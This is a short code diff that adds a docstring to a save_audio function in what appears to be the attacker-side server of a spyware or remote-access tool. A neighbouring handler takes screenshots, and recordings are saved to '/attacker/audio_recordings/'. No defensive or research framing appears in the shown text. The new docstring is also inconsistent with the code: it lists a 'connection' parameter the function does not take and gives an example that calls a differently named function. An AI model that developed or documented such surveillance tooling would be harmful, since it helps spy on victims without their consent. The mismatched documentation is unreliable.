@@ -278,6 +278,19 @@ def handle_screenshot(client_socket, save_path="screenshot.png"):
 
 
 def save_audio(socket, save_dir="/attacker/audio_recordings/"):
+    """
+    Receives audio data from client and saves it permanently to specified directory.
+    
+    Args:
+        connection: The socket connection object
+        save_dir (str): Directory to save audio files (default: '/attacker/audio_recordings/')
+    
+    Returns:
+        str: Path to saved file if successful, None if failed
+    
+    Example:
+        >>> file_path = receive_and_save_audio(client_socket)
+    """
     try:
         # Create directory if it doesn't exist
         os.makedirs(save_dir, exist_ok=True)
